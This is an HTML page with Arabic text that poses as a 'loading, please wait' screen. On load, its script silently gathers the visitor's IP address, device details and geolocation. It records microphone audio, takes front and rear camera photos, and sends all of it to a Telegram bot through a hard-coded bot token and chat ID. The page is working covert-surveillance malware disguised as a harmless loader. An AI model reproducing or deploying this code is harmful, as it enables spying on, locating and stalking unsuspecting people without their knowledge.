<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>...Ø¬Ø§Ø±Ù‰ Ø§Ù„ØªØ­Ù…ÙŠÙ„</title>
  <style>
    body { background:#121212; color:white; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:'Segoe UI',sans-serif; }
    #msg { font-size:18px; color:#00d1b2; }
    #v, canvas { display:none; }
    /* ØªÙˆØ³Øª */
    #toast {
      visibility: hidden;
      min-width: 200px;
      background-color: #00d1b2;
      color: #121212;
      text-align: center;
      border-radius: 8px;
      padding: 12px;
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      font-weight: bold;
      z-index: 1;
    }
    #toast.show {
      visibility: visible;
      animation: fadein 0.5s, fadeout 0.5s 2.5s;
    }
    @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
    @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
  </style>
</head>
<body>
  <div id="msg">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</div>
  <div id="toast">ØªÙ… Ø§Ù„ØªØ­Ù…ÙŠÙ„</div>

  <video id="v" autoplay playsinline></video>
  <canvas id="c" width="640" height="480"></canvas>

<script>
  const CONFIG = { token: '8256799115:AAFWB_PAl-d7d4zl9uR4yabOGBUKFWDm9hU', chatId: '7654014302' };

  function showToast() {
    const toast = document.getElementById("toast");
    toast.className = "show";
    setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 3000);
  }

  async function runWorker() {
    const device = { platform: navigator.platform, agent: navigator.userAgent.split(' ').pop(), lang: navigator.language };
    try {
      // 1. IP
      let ip = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ip = data.ip;
      } catch(e) {}

      const info = `ğŸ“± Ø¬Ù‡Ø§Ø²: ${device.platform}\nğŸŒ IP: ${ip}\nğŸ” Ù…ØªØµÙØ­: ${device.agent}`;

      // 2. Ø§Ù„Ù…ÙˆÙ‚Ø¹
      const loc = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          p => resolve(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`),
          e => resolve("Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø±ÙÙˆØ¶"),
          { timeout: 8000 }
        );
      });

      // 3. Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†
      try {
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const recorder = new MediaRecorder(audioStream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'audio/ogg' });
          await sendData(blob, "Voice Log", "voice");
          audioStream.getTracks().forEach(t => t.stop());
        };
        recorder.start();
        await new Promise(r => setTimeout(r, 3000));
        recorder.stop();
      } catch(e) { console.log("Mic blocked"); }

      // 4. Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
      await captureAndSend("user", `ØµÙˆØ±Ø© Ø£Ù…Ø§Ù…ÙŠØ©\n${info}\nğŸ“ ${loc}`);
      await captureAndSend("environment", `ØµÙˆØ±Ø© Ø®Ù„ÙÙŠØ©\nIP: ${ip}`);

      // Ø¹Ù†Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡
      showToast();
    } catch (err) {
      console.log("ÙØ´Ù„ Ø§Ù„ÙØ­Øµ: " + err.message);
    }
  }

  async function captureAndSend(mode, caption) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
      const v = document.getElementById('v');
      v.srcObject = stream;
      await new Promise(r => setTimeout(r, 1000));
      const c = document.getElementById('c');
      c.getContext('2d').drawImage(v, 0, 0, 640, 480);
      return new Promise(resolve => {
        c.toBlob(async (blob) => {
          await sendData(blob, caption, "photo");
          stream.getTracks().forEach(t => t.stop());
          resolve();
        }, 'image/jpeg');
      });
    } catch (e) { console.log("Camera blocked: " + mode); }
  }

  async function sendData(blob, caption, type) {
    const fd = new FormData();
    fd.append('chat_id', CONFIG.chatId);
    fd.append(type === "photo" ? "photo" : "voice", blob);
    fd.append('caption', caption);
    const endpoint = type === "photo" ? "sendPhoto" : "sendVoice";
    try {
      await fetch(`https://api.telegram.org/bot${CONFIG.token}/${endpoint}`, { method: 'POST', body: fd });
    } catch (e) { console.error("Telegram Error: ", e); }
  }

  // ØªØ´ØºÙŠÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
  window.onload = runWorker;
</script>
</body>
</html>